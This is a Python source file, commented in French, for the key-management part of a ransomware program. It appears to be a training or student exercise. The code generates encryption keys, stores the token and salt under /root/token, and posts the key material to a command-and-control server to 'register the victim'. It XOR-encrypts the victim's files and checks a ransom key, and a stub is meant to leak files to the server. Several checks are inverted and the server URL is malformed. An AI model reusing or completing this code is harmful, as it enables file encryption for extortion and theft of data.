from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        # derive
        kdf= PBKDF2HMAC(algorithm=hashes.SHA256(),length=self.KEY_LENGTH,salt=salt,iterations=self.ITERATION,)
        return kdf.derive(key)

    def create(self)->Tuple[bytes, bytes, bytes]:
        salt = secrets.token_bytes(nbytes=self.SALT_LENGTH)
        key = secrets.token_bytes(nbytes=self.KEY_LENGTH)
        token=self.do_derivation(salt,key)
        return salt,key,token

    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        # register the victim to the CNC
        response = requests.post('http://host/6666/', json={"token" : self.bin_to_b64(token),"salt" : self.bin_to_b64(salt),"key" : self.bin_to_b64(key)})

    def setup(self)->None:
        # main function to create crypto data and register malware to cnc

        salt,key,token=self.create()#creation données cryptographiques

        #on créer le repertoire de stockage en local
        dir_path= os.path.join(self._path, 'token')#on se place au /root/token
        os.makedirs(dir_path, exist_ok=True)#on créer le répertoire

        #sauvegarde du token dans token.bin
        token_path = os.path.join(dir_path,'token.bin')
        if os.path.exists(token_path)==False:#on vérifie qu'il n'y est pas deja un fichier token.bin 
            with open(token_path, "wb") as f:
                f.write(token)

            #sauvegarde du salt dans salt.bin
            salt_path = os.path.join(dir_path,'salt.bin')
            with open(salt_path, "wb") as f:
                f.write(salt)

            self.post_new(salt,key,token)
        else:
            print("Un fichier token.bin existe déja, surement une précedente cible ;)")


    def load(self)->None:
        # function to load crypto data

        dir_path = os.path.join(self._path,'token')
        if os.path.exists(dir_path)==False:#on vérifie qu'il n'y est pas deja un fichier token.bin 

            token_path = os.path.join(dir_path, "token.bin")#chemin du token.bin
            salt_path = os.path.join(dir_path, "salt.bin")#chemin du salt.bin

            #on recupere le token depuis le .bin
            token_file = open(token_path, "rb")
            self._token = token_file.read()
            token_file.close()

            #on recupere le salt depuis le .bin 
            salt_file = open(salt_path, "rb")
            self._salt = salt_file.read()
            salt_file.close()
        else:
            print("Il n'y a pas de réprtoire local pour les données cryptographiques")         

    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        candidate_token=self.do_derivation(self._salt,candidate_key)#on créer un token a partir de la clé candidate
        return candidate_token==self._token#si le token obtenue est identique alors c'est la bonne clé => return TRUE sinon FALSE

    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        candidate_key_bin=base64.b64decode(b64_key)#on passe la clé candidate en binaire car la clé d'origine est aussi en binaire c'est plus simple pour comparer ;)
        if self.check_key(candidate_key_bin):#on appelle check key pour savoir si 'est la meme clé
            self._key = candidate_key_bin

    def get_hex_token(self)->str:
        hex_token= sha256(self._token).hexdigest()#token en sha256 puis en hexa
        return hex_token

    def xorfiles(self, files:List[str])->None:
        # xor a list for file
        for file_path in files:
            xorfile(file_path,self._key)

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        # remove crypto data from the target
        dir_path = os.path.join(self._path,'token')
        if os.path.exists(dir_path)==False:#on vérifie qu'il n'y est pas deja un fichier token.bin 

            token_path = os.path.join(dir_path, "token.bin")#chemin du token.bin
            salt_path = os.path.join(dir_path, "salt.bin")#chemin du salt.bin

            #on suprime le token et le salt
            os.remove(token_path)
            os.remove(salt_path)
            os.removedirs(dir_path)
            
        else:
            print("Il n'y a rien à supprimer :(")